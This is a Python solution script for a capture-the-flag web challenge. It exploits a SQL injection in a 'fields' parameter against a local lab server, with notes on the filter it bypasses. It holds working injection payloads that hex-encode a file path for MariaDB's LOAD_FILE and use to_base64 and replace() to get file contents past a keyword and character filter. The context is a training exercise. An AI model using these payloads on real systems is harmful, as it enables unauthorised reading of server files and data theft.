import requests
import base64


def run_query(query):
    url = "http://192.168.100.3:38210/api/post/1"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/json",
        "Priority": "u=4",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
    }
    data = {
        "fields": [query, "content", "writers"]
    }
    response = requests.post(url, headers=headers, json=data)

    print(response.status_code)
    print(response.text)

"""
injection sink:

SELECT ${fields.join(', ')} FROM posts WHERE id = ${req.params.id}

filter (applied to both input and output):
	newdata = newdata.replace(/u/gi, '');
	// also let's filter out some bad words, that would be too easy otherwise, right?
	while (newdata.match(/(hex|ascii|mid|sleep|where|when|select)/gi)) {
		newdata = newdata.replace(/hex/gi, '');
		newdata = newdata.replace(/ascii/gi, '');
		newdata = newdata.replace(/mid/gi, '');
		newdata = newdata.replace(/sleep/gi, '');
		newdata = newdata.replace(/where/gi, '');
		newdata = newdata.replace(/when/gi, '');
		newdata = newdata.replace(/select/gi, '');
	}

from a mariadb sql shell, we run:

select hex("/flag_uwu.txt")
0x2F666C61675F7577752E747874

select LOAD_FILE(0x2F666C61675F7577752E747874);
> ccit{test_flag_uuu}

-- apparently strings and 0x... are the same thing in mariadb

select hex("u")
> 75
select hex("U")
> 55

select replace(LOAD_FILE(0x2F666C61675F7577752E747874), 0x75, '1');
> ccit{test_flag_1111}


"""

expl = "LOAD_FILE('/flag_uwu.txt') -- "
expl = "titleu from  posts -- "
# works, but results are garbled, and are missing all 'u's
# {"(LOAD_FILE(0x2F666C61675F7577752E747874))":"CCIT{a.h98os|dv6SL(%1<@Z0yTBIX.r\"{$c^\\'-iK,DbHMNF_WEj&2fl4PtmzAq]!QxgV>[J;pGOY~)+3=*:nC/`7k}w5\\\\R#ea?_545aae61}"}
expl = "LOAD_FILE(0x2F666C61675F7577752E747874) -- "

expl = "replace(replace(to_base64(LOAD_FILE(0x2F666C61675F7577752E747874)), 0x55, '@'), 0x75, '#') -- "
#{"replace(replace(to_base64(LOAD_FILE(0x2F666C61675F7577752E747874)), 0x55, '@'), 0x75, '#')":"Q0NJVHt1dWE#dXVVdVV1VVV1dXV1VVV1VXV1dVV1dVVVdVV1dVVVaDk4b3N8ZHY2@0woJTE8QFow\neVRCSVg#ciJ7JGNeVVwndS1pSyxEYkhNTkZfV0VqJjJmbDRQdG16QXFdIVF4Z1Y+W0o7cEdPWX4p\nKzM9Kjp#Qy9gN2t9dzVcXFIjZWE/Xz@0NWFhZTYxfQ=="}

run_query(expl)

encoded_string = "Q0NJVHt1dWE#dXVVdVV1VVV1dXV1VVV1VXV1dVV1dVVVdVV1dVVVaDk4b3N8ZHY2@0woJTE8QFow\neVRCSVg#ciJ7JGNeVVwndS1pSyxEYkhNTkZfV0VqJjJmbDRQdG16QXFdIVF4Z1Y+W0o7cEdPWX4p\nKzM9Kjp#Qy9gN2t9dzVcXFIjZWE/Xz@0NWFhZTYxfQ=="
intermediate_string = encoded_string.replace('#', 'u').replace('@', 'U')
decoded_bytes = base64.b64decode(intermediate_string)
decoded_string = decoded_bytes.decode('utf-8')
print("decoded flag:")
print(decoded_string)



